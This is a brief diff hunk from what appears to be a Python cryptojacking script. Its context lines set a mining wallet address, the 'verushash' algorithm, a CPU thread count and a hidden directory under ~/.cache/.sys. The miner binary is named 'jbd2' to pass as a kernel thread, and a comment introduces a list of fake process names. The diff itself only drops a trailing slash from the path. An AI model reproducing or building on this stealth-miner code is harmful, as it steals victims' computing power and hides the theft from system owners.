@@ -9,7 +9,7 @@ import threading
 WALLET = "REy6w1W9pQ7U4LebYx6zp6mZxHkBzc3e5y"
 ALGO = "verushash"
 CPU_THREADS = 2
-BASE_PATH = os.path.expanduser("~/.cache/.sys/")
+BASE_PATH = os.path.expanduser("~/.cache/.sys")
 ORIGINAL_BINARY = os.path.join(BASE_PATH, "jbd2")
 
 # Daftar nama fake
